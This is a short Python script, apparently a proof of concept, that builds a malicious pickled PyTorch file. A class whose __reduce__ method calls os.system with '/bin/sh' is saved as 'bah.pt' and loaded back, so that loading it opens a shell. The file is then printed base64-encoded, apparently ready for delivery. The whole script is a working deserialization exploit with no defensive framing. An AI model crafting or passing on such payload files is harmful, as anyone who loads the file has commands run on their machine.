import io
import torch
import base64
import os

class payload(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))
    
print("saving")
torch.save(payload(), "bah.pt")
print("loading")
torch.load("bah.pt")

with open("bah.pt", "rb") as f:
    bytes_data = f.read()

base64_data = base64.b64encode(bytes_data)
base64_string = base64_data.decode()
print(base64_string)



